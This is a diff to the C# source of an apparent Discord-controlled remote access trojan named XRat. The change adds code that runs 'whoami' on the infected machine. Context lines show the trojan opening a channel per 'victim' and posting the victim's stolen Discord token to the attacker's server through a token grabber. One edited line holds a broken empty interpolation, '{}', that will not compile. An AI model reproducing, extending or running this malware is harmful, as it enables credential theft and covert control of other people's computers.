@@ -9,9 +9,6 @@ using Discord.WebSocket;
 using XRat;
 using System.Diagnostics;
 using System.Windows.Forms;
-using static System.Net.Mime.MediaTypeNames;
-using System.Runtime.InteropServices;
-using System.Security.Policy;
 
 class Program
 {
@@ -111,8 +108,12 @@ class Program
 
         try
         {
+            string username = Utils.ProCMD("whoami").output;
+            username = username.Split('\\')[1];
+
+            string victimname = string.Empty;
             victimChannel = await guild.CreateTextChannelAsync($"victim-{victimId}");
-            await logsChannel.SendMessageAsync($"@everyone | New victim gotten: {victimId} | Username: {Utils.ProCMD("whoami").output}");
+            await logsChannel.SendMessageAsync($"@everyone | New victim gotten: {victimId} | Username: {}");
             await victimChannel.SendMessageAsync($"@everyone | All commands you will type here controlls only this victim | {victimId}");
 
             await victimChannel.SendMessageAsync($"@everyone | Discord Token:\n{DiscordGrabber.GetToken()}");
